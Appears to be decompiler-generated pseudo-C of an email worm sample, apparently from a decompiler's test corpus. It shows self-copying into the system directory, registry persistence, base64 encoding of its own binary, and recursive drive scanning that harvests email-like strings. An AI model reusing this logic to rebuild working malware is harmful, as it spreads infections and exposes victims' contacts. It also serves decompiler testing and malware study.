// subject.c
// Generated on TIMESTAMP by decompiling malware_via_email/malware_0084/ia32_pe/subject.exe
// using Decompiler version VERSION

#include "subject.h"

void fn00401000(word32 dwArg04, word32 dwArg08)
{
	word32 edi_11 = dwArg04;
	word32 ecx_14 = dwArg08 >>u 0x00000002;
	if (dwArg08 >>u 0x00000002 != 0x00000000)
		while (ecx_14 != 0x00000000)
		{
			Mem36[edi_11 + 0x00000000:word32] = 0x00000000;
			edi_11 = edi_11 + 0x00000004;
			ecx_14 = ecx_14 - 0x00000001;
		}
	word32 ecx_21 = dwArg08 & 0x00000003;
	if ((dwArg08 & 0x00000003) != 0x00000000)
		while (ecx_21 != 0x00000000)
		{
			Mem31[edi_11 + 0x00000000:byte] = 0x00;
			edi_11 = edi_11 + 0x00000001;
			ecx_21 = ecx_21 - 0x00000001;
		}
	return;
}

word32 fn004010DD(word32 edx, word32 dwArg04, word32 dwArg08, word32 dwArg0C)
{
	word32 dwLoc08_101 = 0x00000000;
	word32 esi_151 = dwArg04;
	word32 edi_108 = dwArg08;
	word32 ecx_111 = dwArg0C;
	word32 eax_105 = 0x00000000;
	do
	{
		byte al_143;
		word32 eax_142;
		word32 ebx_147 = 0x00000000;
		word32 eax_49 = DPB(eax_105, Mem0[esi_151 + 0x00000000:byte], 0, 8);
		esi_151 = esi_151 + 0x00000001;
		word32 ecx_156 = ecx_111 - 0x00000001;
		if (ecx_156 == 0x00000000)
		{
			eax_142 = eax_49 << 0x00000010;
			al_143 = (byte) (eax_49 << 0x00000010);
			ebx_147 = 0x00000002;
		}
		else
		{
			word32 eax_150 = DPB(eax_49 << 0x00000008, Mem0[esi_151 + 0x00000000:byte], 0, 8);
			esi_151 = esi_151 + 0x00000001;
			eax_142 = eax_150 << 0x00000008;
			al_143 = (byte) (eax_150 << 0x00000008);
			ecx_156 = ecx_156 - 0x00000001;
			if (ecx_156 == 0x00000001)
				ebx_147 = 0x00000001;
			else
			{
				al_143 = Mem0[esi_151 + 0x00000001:byte];
				eax_142 = DPB(eax_150 << 0x00000008, al_143, 0, 8);
				esi_151 = esi_151 + 0x00000002;
				ecx_156 = ecx_156 - 0x00000002;
			}
		}
		word32 ecx_68 = 0x00000004;
		do
		{
			eax_142 = eax_142 >>u 0x00000006;
			edx = DPB(__rol(edx, 0x08), al_143 & 0x3F, 0, 8);
			al_143 = (byte) eax_142;
			ecx_68 = ecx_68 - 0x00000001;
		} while (ecx_68 != 0x00000000);
		word32 edx_88 = fn00401159(0x00000004, edx);
		Mem92[edi_108 + 0x00000000:word32] = edx_88;
		word32 v18_100 = dwLoc08_101 + 0x00000001;
		edi_108 = edi_108 + 0x00000004;
		eax_105 = eax_142;
		edx = edx_88;
		dwLoc08_101 = v18_100;
		if (v18_100 == 0x00000012)
		{
			Mem134[fp + 0xFFFFFFE4:word32] = eax_142;
			Mem136[edi_108 + 0x00000000:word16] = 0x0A0D;
			dwLoc08_101 = 0x00000000;
			edi_108 = edi_108 + 0x00000002;
			eax_105 = 0x00000004;
		}
		ecx_111 = ecx_156;
	} while (ecx_156 != 0x00000000);
	word32 ecx_115 = ebx_147;
	word32 edi_116 = edi_108 - ebx_147;
	while (ecx_115 != 0x00000000)
	{
		Mem121[edi_116 + 0x00000000:byte] = 0x3D;
		edi_116 = edi_116 + 0x00000001;
		ecx_115 = ecx_115 - 0x00000001;
	}
	return ecx_115;
}

word32 fn00401159(word32 ecx, word32 edx)
{
	do
	{
		word32 edx_14;
		if (dl >=u 0x3E)
			edx_14 = DPB(edx, (dl - 0x3E << 0x02) + 0x2B, 0, 8);
		else if (dl <=u 0x33)
		{
			byte dl_22 = dl + 0x41;
			edx_14 = DPB(edx, dl_22, 0, 8);
			if (dl_22 >u 0x5A)
				edx_14 = DPB(edx, dl_22 + 0x06, 0, 8);
		}
		else
			edx_14 = DPB(edx, dl + 0xFC, 0, 8);
		edx = __rol(edx_14, 0x08);
		dl = (byte) edx;
		ecx = ecx - 0x00000001;
	} while (ecx != 0x00000000);
	return edx;
}

void fn0040126F(word32 dwArg04)
{
	Mem14[0x00405814:word32] = dwArg04;
	Mem15[0x004056C5:word32] = 0x00000001;
	word32 edi_17 = 0x00405814;
	word32 eax_11 = dwArg04;
	do
	{
		edi_17 = edi_17 + 0x00000004;
		eax_11 = (word32) (Mem15[0x004056C9:word32] *u eax_11);
		Mem21[edi_17 + 0x00000000:word32] = eax_11;
		Mem23[0x004056C5:word32] = Mem21[0x004056C5:word32] + 0x00000001;
	} while (Mem23[0x004056C5:word32] != 0x00000270);
	return;
}

word32 fn004012AA(word32 dwArg04, ptr32 ecxOut)
{
	*ecxOut = ecx;
	if (Mem0[0x004056C5:word32] >=u 0x00000270)
	{
		if (Mem0[0x004056C5:word32] == 0x00000271)
			fn0040126F(0x00001105);
		word32 dwLoc08_103 = 0x00000000;
		word32 esi_101 = 0x00405814;
		do
		{
			word32 eax_83 = Mem0[esi_101 + 0x00000000:word32] & 0x80000000 | Mem0[esi_101 + 0x00000004:word32] & 0x7FFFFFFF;
			word32 eax_160 = eax_83 >>u 0x00000001 ^ Mem0[esi_101 + 0x00000634:word32];
			if ((eax_83 & 0x00000001) != 0x00000000)
				eax_160 = eax_160 ^ 0x9908B0DF;
			Mem100[esi_101 + 0x00000000:word32] = eax_160;
			word32 v16_102 = dwLoc08_103 + 0x00000001;
			esi_101 = esi_101 + 0x00000004;
			dwLoc08_103 = v16_102;
		} while (v16_102 != 0x000000E3);
		do
		{
			word32 eax_113 = Mem100[esi_101 + 0x00000000:word32] & 0x80000000 | Mem100[esi_101 + 0x00000004:word32] & 0x7FFFFFFF;
			word32 eax_119 = eax_113 >>u 0x00000001 ^ Mem100[esi_101 + 0xFFFFFC74:word32];
			if ((eax_113 & 0x00000001) != 0x00000000)
				eax_119 = eax_119 ^ 0x9908B0DF;
			Mem130[esi_101 + 0x00000000:word32] = eax_119;
			word32 v17_132 = dwLoc08_103 + 0x00000001;
			esi_101 = esi_101 + 0x00000004;
			dwLoc08_103 = v17_132;
		} while (v17_132 != 0x0000026F);
		word32 ecx_141 = eax_113 & 0x00000001 & 0x00000001;
		word32 eax_139 = eax_119 ^ Mem130[0x00405E44:word32];
		word32 ecx_142;
		*ecxOut = ecx_141;
		if (ecx_141 != 0x00000000)
			eax_139 = eax_139 ^ 0x9908B0DF;
		Mem150[esi_101 + 0x00000000:word32] = eax_139;
		Mem151[0x004056C5:word32] = 0x00000000;
	}
	word32 eax_32 = Mem0[0x004056C5:word32];
	Mem34[0x004056C5:word32] = Mem0[0x004056C5:word32] + 0x00000001;
	word32 eax_37 = 0x00405814[eax_32 * 0x00000004];
	word32 ebx_40 = eax_37 ^ eax_37 >>u 0x0000000B;
	word32 ebx_44 = ebx_40 ^ ebx_40 << 0x00000007 & 0x9D2C5680;
	word32 ebx_48 = ebx_44 ^ ebx_44 << 0x0000000F & 0xEFC60000;
	return SEQ(0x00000000, ebx_48 >>u 0x00000012 ^ ebx_48) % dwArg04;
}

void fn00401524(word32 dwArg04, word32 dwArg08)
{
	Mem17[dwArg04 + 0x00000000:word32] = GlobalAlloc(0x00000040, dwArg08 << 0x00000002);
	return;
}

void fn004015A5()
{
	RegCreateKeyA(0x80000001, 0x004056EF, fp - 0x00000008);
	if (RegQueryValueExA(dwLoc08, 0x00405702, 0x00000000, fp - 0x0000000C, 0x004056CD, fp - 0x00000010) != 0x00000000)
	{
		word32 edi_63 = 0x004056CD;
		word32 esi_64 = 0x00000009;
		do
		{
			word32 ecx_69;
			Mem75[edi_63 + 0x00000000:byte] = (byte) (fn004012AA(0x00000009, out ecx_69) + 0x00000031);
			edi_63 = edi_63 + 0x00000001;
			esi_64 = esi_64 - 0x00000001;
		} while (esi_64 != 0x00000000);
		Mem81[fp + 0xFFFFFFE4:word32] = 0x00000008;
		Mem83[fp + 0xFFFFFFE0:word32] = 0x004056CD;
		Mem87[fp + 0xFFFFFFD8:word32] = 0x00000000;
		Mem89[fp + 0xFFFFFFD4:word32] = 0x00405702;
		RegSetValueExA(dwLoc08, 0x00405702, 0x00000000, 0x00000001, 0x004056CD, 0x00000009);
	}
	RegCloseKey(dwLoc08);
	return;
}

word32 fn00401625()
{
	RegCreateKeyA(0x80000001, 0x00405706, fp - 0x00000008);
	RegSetValueExA(dwLoc08, 0x00405734, 0x00000000, 0x00000001, 0x00407F20, lstrlenA(0x00407F20));
	return RegCloseKey(dwLoc08);
}

word32 fn00401669()
{
	word32 eax_47;
	GetLocalTime(fp - 0x00000014);
	fn00401000(fp - 0x00000024, 0x00000010);
	SystemTimeToFileTime(fp - 0x00000014, fp - 0x0000002C);
	SystemTimeToFileTime(fp - 0x00000024, fp - 0x00000034);
	if (CompareFileTime(fp - 0x0000002C, fp - 0x00000034) == 0x00000001)
		eax_47 = 0x00000000;
	else
		eax_47 = 0x00000001;
	return eax_47;
}

word32 fn004016CA()
{
	word32 eax_12 = GlobalAlloc(0x00000040, 0x00002000);
	GetModuleFileNameA(0x00000000, eax_12, 0x00001FFF);
	word32 eax_37 = CreateFileA(eax_12, 0x80000000, 0x00000001, 0x00000000, 0x00000003, 0x00000000, 0x00000000);
	if (eax_37 != 0x00000001)
	{
		Mem64[fp + 0xFFFFFFEC:word32] = 0x00000000;
		Mem66[fp + 0xFFFFFFE8:word32] = eax_37;
		word32 eax_67 = GetFileSize(0x00000000, 0x00000000);
		if (eax_67 != 0x00000001)
		{
			Mem86[fp + 0xFFFFFFEC:word32] = 0x00000000;
			Mem90[fp + 0xFFFFFFE4:word32] = 0x00000000;
			Mem92[fp + 0xFFFFFFE0:word32] = 0x00000002;
			Mem94[fp + 0xFFFFFFDC:word32] = 0x00000000;
			Mem96[fp + 0xFFFFFFD8:word32] = eax_37;
			word32 eax_97 = CreateFileMappingA(0x80000000, 0x00000001, 0x00000000, 0x00000003, 0x00000000, 0x00000000);
			if (eax_97 != 0x00000000)
			{
				Mem105[fp + 0xFFFFFFEC:word32] = 0x00000000;
				Mem107[fp + 0xFFFFFFE8:word32] = 0x00000000;
				Mem109[fp + 0xFFFFFFE4:word32] = 0x00000000;
				Mem111[fp + 0xFFFFFFE0:word32] = 0x00000004;
				Mem113[fp + 0xFFFFFFDC:word32] = eax_97;
				word32 eax_114 = MapViewOfFile(0x00000000, 0x00000002, 0x00000000, 0x00000000, 0x00000000);
				if (eax_114 != 0x00000000)
				{
					Mem128[fp + 0xFFFFFFEC:word32] = eax_114;
					Mem130[fp + 0xFFFFFFE8:word32] = eax_114;
					Mem135[fp + 0xFFFFFFE4:word32] = eax_67 << 0x00000002;
					Mem137[fp + 0xFFFFFFE0:word32] = 0x00000040;
					Mem140[0x00407F14:word32] = GlobalAlloc(0x00000004, 0x00000000);
					Mem144[fp + 0xFFFFFFE8:word32] = eax_67;
					Mem146[fp + 0xFFFFFFE4:word32] = Mem144[0x00407F14:word32];
					Mem148[fp + 0xFFFFFFE0:word32] = 0x00000000;
					ecx = fn004010DD(0x00000000, 0x00000000, 0x00000003, 0x00000000);
					Mem152[fp + 0xFFFFFFE8:word32] = Mem148[0x00407F14:word32];
					Mem155[0x00407F18:word32] = lstrlenA(0x00000000);
					UnmapViewOfFile(0x00000000);
				}
				CloseHandle(eax_97);
			}
		}
		CloseHandle(eax_37);
	}
	GlobalFree(eax_12);
	return ecx;
}

void fn0040179B()
{
	RegCreateKeyA(0x80000001, 0x004056EF, fp - 0x00000008);
	RegSetValueExA(dwLoc08, 0x0040574F, 0x00000000, 0x00000004, fp - 0x0000000C, 0x00000004);
	RegCloseKey(dwLoc08);
	return;
}

word32 fn004017DC()
{
	word32 ebx_42;
	RegCreateKeyA(0x80000001, 0x004056EF, fp - 0x00000008);
	if (RegQueryValueExA(dwLoc08, 0x0040574F, 0x00000000, fp - 0x0000000C, fp - 0x00000014, fp - 0x00000010) != 0x00000000)
		ebx_42 = 0x00000001;
	else
		ebx_42 = 0x00000000;
	RegCloseKey(dwLoc08);
	return ebx_42;
}

word32 fn00401835()
{
// def fp
// def dwLoc0198
// def tLoc019A
	eax_8 = fn00401669();
	eax_9 = eax_8;
	if (eax_8 == 0x00000000)
	{
		dwLoc0198_124 = 0x00000000;
		ExitProcess(dwLoc0198_124);
	}
// dwLoc0198_14 = PHI(dwLoc0198, dwLoc0198_124)
	eax_15 = GetTickCount();
	esp_16 = fp + 0xFFFFFE68;
	Mem17[fp + 0xFFFFFE68:word32] = eax_15;
	fn0040126F(dwLoc0198_14);
	fn004015A5();
	esp_20 = fp + 0xFFFFFE68;
	Mem21[fp + 0xFFFFFE68:word32] = fp + 0xFFFFFE6E;
	dwLoc019C_23 = 0x00000101;
	tLoc019C_24 = (WORD) dwLoc019C_23;
	WSAStartup(tLoc019C_24, tLoc019A);
	fn00402ADD();
	tLoc019A_29 = 0x00000000;
	dwLoc019E_31 = 0x00000000;
	dwLoc01A2_33 = 0x00000000;
	eax_34 = CreateMutexA(dwLoc01A2_33, dwLoc019E_31, tLoc019A_29);
	Mem36[0x00407F1C:word32] = eax_34;
	fn00402737();
	ecx_37 = fn004016CA();
	tLoc019A_39 = 0x00000104;
	dwLoc019E_41 = 0x00407F20;
	GetSystemDirectoryA(dwLoc019E_41, tLoc019A_39);
	tLoc019A_45 = 0x00000104;
	dwLoc019E_47 = 0x00408025;
	dwLoc01A2_49 = 0x00000000;
	GetModuleFileNameA(dwLoc01A2_49, dwLoc019E_47, tLoc019A_45);
	tLoc019A_53 = 0x00405742;
	dwLoc019E_55 = 0x00407F20;
	lstrcatA(dwLoc019E_55, tLoc019A_53);
	eax_58 = fn00401625();
	shlwapi.dll!StrStrIA();
	eax_63 = eax_58 | eax_58;
	if (eax_63 == 0x00000000)
	{
		eax_78 = GetCommandLineA();
		do
		{
// eax_79 = PHI(eax_78, eax_107)
			if (Mem36[eax_79 + 0x00000000:word32] == 0x6470752D)
				goto l004018F5;
			eax_107 = eax_79 + 0x00000001;
		} while (Mem36[eax_107 + 0x00000003:byte] != 0x00);
		esp_110 = fp + 0xFFFFFE5E;
		Mem111[esp_110 + 0x00000000:word32] = 0x00000005;
		dwLoc01A6_113 = 0x004056E1;
		WinExec(dwLoc01A6_113, 0x00000000);
		dwLoc01A2_86 = 0x00000000;
		esp_87 = fp + 0xFFFFFE5A;
		Mem88[esp_87 + 0x00000000:word32] = 0x00407F20;
		dwLoc01AA_90 = 0x00408025;
		eax_91 = CopyFileA(dwLoc01AA_90, 0x004056E1, dwLoc01A2_86);
		eax_93 = eax_91 | eax_91;
		if (eax_93 != 0x00000000)
		{
			esp_101 = fp + 0xFFFFFE5E;
			Mem102[esp_101 + 0x00000000:word32] = 0x00000000;
			esp_103 = fp + 0xFFFFFE5A;
			Mem104[esp_103 + 0x00000000:word32] = 0x00407F20;
			WinExec(0x00407F20, 0x00000000);
		}
		esp_98 = fp + 0xFFFFFE5E;
		Mem99[esp_98 + 0x00000000:word32] = 0x00000000;
		ExitProcess(0x00000000);
	}
	else
	{
		eax_116 = fn004017DC();
		eax_117 = eax_116 | eax_116;
		if (eax_117 != 0x00000000)
			Mem122[0x00405754:word32] = 0x00000001;
		fn0040179B();
	}
	return ecx_37;
}

void fn00401C78(word32 dwArg04, word32 dwArg08, word32 dwArg0C)
{
	word32 eax_12 = GlobalAlloc(0x00000000, 0x0000000C);
	Mem18[eax_12 + 0x00000000:word32] = dwArg04;
	Mem23[eax_12 + 0x00000004:word32] = dwArg08;
	Mem28[eax_12 + 0x00000008:word32] = dwArg0C;
	CloseHandle(CreateThread(0x00000000, 0x00000000, 0x00401BA7, eax_12, 0x00000000, fp - 0x0000000C));
	return;
}

void fn00402737()
{
	Mem16[0x00408146:word32] = CreateMutexA(0x00000000, 0x00000000, 0x00000000);
	Mem17[0x0040812A:word32] = 0x00000000;
	Mem18[0x0040812E:word32] = 0x00000000;
	word32 ebx_19 = 0x00000005;
	word32 edi_20 = 0x00408132;
	do
	{
		Mem30[edi_20 + 0x00000000:word32] = GlobalAlloc(0x00000040, 0x0000000C);
		edi_20 = edi_20 + 0x00000004;
		ebx_19 = ebx_19 - 0x00000001;
	} while (ebx_19 != 0x00000000);
	return;
}

word32 fn004028A5(word32 esi, word32 dwArg04)
{
	word32 ebx_12 = esi;
	word32 esi_14 = esi - 0x00000002;
	byte cl_16 = 0x01;
	while (esi_14 >=u dwArg04)
	{
		byte al_49 = Mem0[esi_14 + 0x00000000:byte];
		esi_14 = esi_14 - 0x00000001;
		if ((al_49 <u 0x30 || al_49 >u 0x39) && ((al_49 <u 0x41 || al_49 >u 0x5A) && ((al_49 <u 0x61 || al_49 >u 0x7A) && (al_49 != 0x2E && (al_49 != 0x5F && (al_49 != 0x2D && (al_49 != 0x00 || cl_16 == 0x00)))))))
			break;
		ebx_12 = esi_14 + 0x00000001;
		cl_16 = al_49;
	}
	return ebx_12;
}

word32 fn004028F3(word32 esi, word32 dwArg04)
{
	word32 ebx_12 = esi;
	byte cl_14 = 0x01;
	while (esi <u dwArg04)
	{
		byte al_46 = Mem0[esi + 0x00000000:byte];
		esi = esi + 0x00000001;
		if ((al_46 <u 0x30 || al_46 >u 0x39) && ((al_46 <u 0x41 || al_46 >u 0x5A) && ((al_46 <u 0x61 || al_46 >u 0x7A) && (al_46 != 0x2E && (al_46 != 0x5F && (al_46 != 0x2D && (al_46 != 0x00 || cl_14 == 0x00)))))))
			break;
		ebx_12 = esi;
		cl_14 = al_46;
	}
	return ebx_12;
}

word32 fn0040293D(word32 dwArg04, word32 dwArg08)
{
	if (dwArg08 - dwArg04 >= 0x00000002)
		return 0x00000001;
	else
		return 0x00000000;
}

void fn0040295A(word32 eax, word32 dwArg04)
{
	shlwapi.dll!StrRChrA();
	if (eax != 0x00000000)
		if (lstrlenA(eax) <=u 0x00000002)
			;
	return;
}

word32 fn00402985(word32 ebp, word32 dwArg04, word32 dwArg08, word32 dwArg0C)
{
	word32 dwLoc10_16 = 0x00000000;
	word32 esi_109 = dwArg04;
	word32 esp_110 = fp + 0xFFFFFDF0;
	word32 v8_25 = dwArg08 + dwArg04;
	while (esi_109 <u v8_25)
	{
		word32 v10_52 = dwLoc10_16 + 0x00000001;
		dwLoc10_16 = v10_52;
		if (v10_52 == 0x00002710)
		{
			word32 esp_182 = esp_110 - 0x00000004;
			Mem183[esp_182 + 0x00000000:word32] = 0x00000001;
			Sleep(Mem183[esp_182 + 0x00000000:DWORD]);
			esp_110 = esp_182 + 0x00000004;
			dwLoc10_16 = 0x00000000;
		}
		esi_109 = esi_109 + 0x00000001;
		if (Mem0[esi_109 + 0x00000000:byte] == 0x40)
		{
			word32 esp_79 = esp_110 - 0x00000004;
			Mem80[esp_79 + 0x00000000:word32] = esi_109;
			Mem82[esp_79 - 0x00000004:word32] = dwArg04;
			word32 eax_84 = fn004028A5(esi_109, dwArg00);
			Mem88[esp_79 - 0x00000004:word32] = v8_25;
			word32 esp_108 = esp_79;
			ecx = fn004028F3(esi_109, dwArg00) - eax_84;
			if (ecx <u 0x000001F4 && ecx >u 0x00000005)
			{
				word32 esi_114 = eax_84;
				word32 edi_115 = fp + 0xFFFFFDFC;
				word32 edx_116 = 0x00000000;
				do
				{
					byte al_125 = Mem88[esi_114 + 0x00000000:byte];
					esi_114 = esi_114 + 0x00000001;
					if (al_125 != 0x00)
					{
						Mem177[edi_115 + 0x00000000:byte] = al_125;
						edi_115 = edi_115 + 0x00000001;
						if (al_125 == 0x40)
							edx_116 = edi_115;
					}
					ecx = ecx - 0x00000001;
				} while (ecx != 0x00000000);
				Mem138[edi_115 + 0x00000000:byte] = 0x00;
				word32 edi_139 = edi_115 + 0x00000001;
				if (edx_116 != 0x00000000)
				{
					Mem145[esp_79 - 0x00000004:word32] = edx_116;
					Mem148[esp_79 - 0x00000008:word32] = fp + 0xFFFFFDFC;
					word32 eax_149 = lstrlenA(Mem148[esp_79 - 0x00000008:LPCSTR]);
					word32 edx_151 = Mem148[esp_79 - 0x00000004:word32];
					esp_108 = esp_79;
					if (eax_149 >u 0x00000005)
					{
						Mem156[esp_79 - 0x00000004:word32] = edx_151;
						Mem159[esp_79 - 0x00000008:word32] = fp + 0xFFFFFDFC;
						word32 eax_160 = fn0040293D(dwArg00, dwArg04);
						Mem164[esp_79 - 0x00000004:word32] = edi_139;
						Mem166[esp_79 - 0x00000008:word32] = edx_151;
						fn0040295A(eax_160, dwArg00);
						esp_108 = esp_79;
						if (eax_160 != 0x00000000)
						{
							Mem175[esp_79 - 0x00000004:word32] = fp + 0xFFFFFDFC;
							esp_108 = esp_79 - 0x00000004;
							dwArg0C();
						}
					}
				}
			}
			esi_109 = Mem88[esp_108 + 0x00000000:word32];
			esp_110 = esp_108 + 0x00000004;
		}
	}
	return ecx;
}

word32 fn00402A5A(word32 dwArg04, word32 dwArg08, ptr32 esiOut)
{
	*esiOut = esi;
	word32 eax_26 = CreateFileA(dwArg04, 0x80000000, 0x00000001, 0x00000000, 0x00000003, 0x00000000, 0x00000000);
	if (eax_26 != 0x00000001)
	{
		Mem50[fp + 0xFFFFFFEC:word32] = 0x00000000;
		Mem52[fp + 0xFFFFFFE8:word32] = eax_26;
		word32 eax_53 = GetFileSize(0x00000000, 0x00000000);
		if (eax_53 != 0x00000001)
		{
			Mem70[fp + 0xFFFFFFEC:word32] = 0x00000000;
			Mem74[fp + 0xFFFFFFE4:word32] = 0x00000000;
			Mem76[fp + 0xFFFFFFE0:word32] = 0x00000002;
			Mem78[fp + 0xFFFFFFDC:word32] = 0x00000000;
			Mem80[fp + 0xFFFFFFD8:word32] = eax_26;
			word32 eax_81 = CreateFileMappingA(0x80000000, 0x00000001, 0x00000000, 0x00000003, 0x00000000, 0x00000000);
			if (eax_81 != 0x00000000)
			{
				Mem89[fp + 0xFFFFFFEC:word32] = 0x00000000;
				Mem91[fp + 0xFFFFFFE8:word32] = 0x00000000;
				Mem93[fp + 0xFFFFFFE4:word32] = 0x00000000;
				Mem95[fp + 0xFFFFFFE0:word32] = 0x00000004;
				Mem97[fp + 0xFFFFFFDC:word32] = eax_81;
				word32 eax_98 = MapViewOfFile(0x00000000, 0x00000002, 0x00000000, 0x00000000, 0x00000000);
				if (eax_98 != 0x00000000)
				{
					Mem110[fp + 0xFFFFFFEC:word32] = eax_98;
					Mem113[fp + 0xFFFFFFE8:word32] = dwArg08;
					Mem115[fp + 0xFFFFFFE4:word32] = eax_53;
					Mem117[fp + 0xFFFFFFE0:word32] = eax_98;
					ecx = fn00402985(fp - 0x00000004, 0x00000000, 0x00000003, 0x00000000);
					UnmapViewOfFile(0x00000000);
				}
				CloseHandle(eax_81);
			}
		}
		CloseHandle(eax_26);
	}
	return ecx;
}

void fn00402ADD()
{
	fn00401524(0x0040814A, 0x00001388);
	Mem8[0x0040814E:byte] = 0x00;
	return;
}

word32 fn00402B8F(word32 ecx, word32 ebp, word32 dwArg04, ptr32 esiOut, ptr32 ediOut)
{
	*esiOut = esi;
	word32 esp_20 = fp - 0x00000008;
	word32 edi_18 = 0x0040501C;
	do
	{
		ecx = ecx | 0xFFFFFFFF;
		do
		{
			if (ecx_73 == 0x00000000)
				break;
			edi_18 = edi_74 + 0x00000001;
			ecx = ecx_73 - 0x00000001;
			word32 ecx_73 = ecx;
			word32 edi_74 = edi_18;
		} while (0x00 != Mem0[edi_74 + 0x00000000:byte]);
		word32 esp_32 = esp_20 - 0x00000004;
		Mem33[esp_32 + 0x00000000:word32] = edi_18;
		Mem36[esp_32 - 0x00000004:word32] = dwArg04;
		shlwapi.dll!StrStrIA();
		esp_20 = esp_32 - 0x00000004;
		if (0x00000000 != 0x00000000)
		{
			Mem51[esp_32 - 0x00000008:word32] = 0x00402B2C;
			Mem53[esp_32 - 0x0000000C:word32] = dwArg04;
			word32 esi_55;
			word32 ecx_56 = fn00402A5A(dwArg00, dwArg04, out esi_55);
			word32 edi_58;
			*ediOut = Mem53[esp_32 - 0x00000004:word32];
			return ecx_56;
		}
	} while (Mem36[edi_74 + 0x00000000:byte] != 0x00);
	word32 edi_64;
	*ediOut = Mem36[esp_32 - 0x00000004:word32];
	return ecx_73;
}

word32 fn00402BCB(word32 ecx, word32 ebp, word32 dwArg04, word32 dwArg08, ptr32 esiOut)
{
	*esiOut = esi;
	word32 eax_15 = LocalAlloc(0x00000000, 0x00000400);
	word32 eax_22 = LocalAlloc(0x00000000, 0x0000013E);
	word32 edi_136 = lstrlenA(dwArg04);
	lstrcatA(dwArg04, 0x004057E7);
	word32 eax_41 = FindFirstFileA(dwArg04, eax_22);
	word32 esp_105 = fp + 0xFFFFFFEC;
	if (eax_41 != 0x00000001)
	{
		do
		{
			Mem79[edi_136 + dwArg04:byte] = 0x00;
			if (Mem79[eax_22 + 0x0000002C:word16] != 0x002E && Mem79[eax_22 + 0x0000002C:word16] != 0x2E2E)
			{
				word32 esp_108 = esp_105 - 0x00000004;
				Mem109[esp_108 + 0x00000000:word32] = eax_22 + 0x0000002C;
				Mem111[esp_108 - 0x00000004:word32] = dwArg04;
				lstrcatA(Mem111[esp_108 - 0x00000004:LPSTR], Mem111[esp_108 + 0x00000000:LPCSTR]);
				if ((Mem111[eax_22 + 0x00000000:word32] & 0x00000010) != 0x00000000)
				{
					Mem120[esp_108 + 0x00000000:word32] = 0x004057E5;
					Mem122[esp_108 - 0x00000004:word32] = dwArg04;
					lstrcatA(Mem122[esp_108 - 0x00000004:LPSTR], Mem122[esp_108 + 0x00000000:LPCSTR]);
					Mem127[esp_108 + 0x00000000:word32] = dwArg08;
					Mem129[esp_108 - 0x00000004:word32] = dwArg04;
					esp_105 = esp_108 - 0x00000004;
					word32 esi_131;
					ecx = fn00402BCB(ecx, fp - 0x00000004, dwArg00, dwArg04, out esi_131);
				}
				else
				{
					Mem134[esp_108 + 0x00000000:word32] = dwArg04;
					word32 esi_135;
					ecx = fn00402B8F(ecx, fp - 0x00000004, dwArg00, out esi_135, out edi_136);
					esp_105 = esp_108 + 0x00000004;
				}
			}
			word32 esp_90 = esp_105 - 0x00000004;
			Mem91[esp_90 + 0x00000000:word32] = 0x00000001;
			Sleep(Mem91[esp_90 + 0x00000000:DWORD]);
			Mem94[esp_90 + 0x00000000:word32] = eax_22;
			Mem96[esp_90 - 0x00000004:word32] = eax_41;
			esp_105 = esp_90 + 0x00000004;
		} while (FindNextFileA(Mem96[esp_90 - 0x00000004:HANDLE], Mem96[esp_90 + 0x00000000:LPWIN32_FIND_DATAA]) != 0x00000000);
		Mem103[esp_90 + 0x00000000:word32] = eax_41;
		FindClose(Mem103[esp_90 + 0x00000000:HANDLE]);
		esp_105 = esp_90 + 0x00000004;
	}
	word32 esp_59 = esp_105 - 0x00000004;
	Mem60[esp_59 + 0x00000000:word32] = eax_15;
	LocalFree(Mem60[esp_59 + 0x00000000:HLOCAL]);
	Mem64[esp_59 + 0x00000000:word32] = eax_22;
	LocalFree(Mem64[esp_59 + 0x00000000:HLOCAL]);
	return ecx;
}

word32 fn00402C9D(word32 ecx, word32 dwArg04, ptr32 esiOut)
{
	word32 eax_12 = GlobalAlloc(0x00000040, 0x00010000);
	word32 eax_20 = lstrcpyA(eax_12, dwArg04);
	word32 esi_27;
	word32 ecx_28 = fn00402BCB(ecx, fp - 0x00000004, eax_20, eax_20, out esi_27);
	GlobalFree(eax_12);
	return ecx_28;
}

void fn00402CCE(word32 ecx)
{
	word32 eax_18 = GlobalAlloc(0x00000040, 0x00002000);
	GetLogicalDriveStringsA(0x00001FFF, eax_18);
	word32 esi_27 = eax_18;
	while (Mem0[esi_27 + 0x00000000:byte] != 0x00)
	{
		if (GetDriveTypeA(esi_27) == 0x00000003)
			ecx = fn00402C9D(ecx, esi_27, out esi_27);
		esi_27 = esi_27 + lstrlenA(esi_27) + 0x00000001;
	}
	GlobalFree(eax_18);
	return;
}

void fn00402E07()
{
	CloseHandle(CreateThread(0x00000000, 0x00000000, 0x00402DED, 0x00000000, 0x00000000, fp - 0x00000008));
	return;
}

void fn0040318A()
{
	CoInitialize(0x00000000);
	word32 ecx_10 = fn00401835();
	if (Mem0[0x00405003:word32] == 0x00000000)
	{
		Mem25[fp - 0x00000004:word32] = 0x0000AFC8;
		Mem31[0x00405003:word32] = fn004012AA(0x00000000, out ecx_10) + 0x00001388;
	}
	fn00401C78(Mem0[0x00405003:word32], 0x004030F6, 0x0040575C);
	fn00402E07();
	if (Mem0[0x00405754:word32] != 0x00000000)
	{
		fn00402CCE(ecx_10);
		goto l004031DB;
	}
l004031DB:
	while (true)
		Sleep(0x000003E8);
}

